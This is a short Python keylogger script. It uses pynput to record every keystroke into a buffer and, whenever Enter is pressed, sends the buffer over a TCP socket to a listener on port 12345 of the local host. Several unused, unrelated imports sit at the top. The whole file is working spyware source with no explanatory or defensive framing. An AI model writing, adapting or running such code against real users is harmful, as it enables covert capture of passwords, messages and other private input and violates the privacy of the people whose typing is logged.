
from ossaudiodev import SNDCTL_DSP_SPEED
import socket
import os
from ssl import ALERT_DESCRIPTION_UNKNOWN_CA
from tkinter.filedialog import asksaveasfile
from hamcrest import contains
from numpy import asscalar
from pynput.keyboard import Key, Listener

# Create Socket and Connect to Host
host = socket.gethostname()
port = 12345
s = socket.socket()		# TCP socket object
s.connect((host,port))

# Logstring is a string but will be treated like char array.
# Logged key strokes will be added to logstring one by one.
# A loop will reinitialise logstring as "\n" after every send.
logstring = "\n"


# Keylog 

def on_press(key):
    global logstring
    if key != Key.enter:
        if (str(key)).__contains__("Key."):
            if key == Key.space:
                logstring += " "
            else:
                if len(logstring) > 1:
                    logstring += "\n"
                    logstring += str(key).strip("'")
                else:
                    logstring += str(key).strip("'")
                    logstring += "\n"

        else: 
            logstring += str(key).strip("'")
    else:
        s.sendall((logstring).encode('utf-8'))
        logstring = "\n"

with Listener(on_press=on_press) as listener :
    listener.join() 
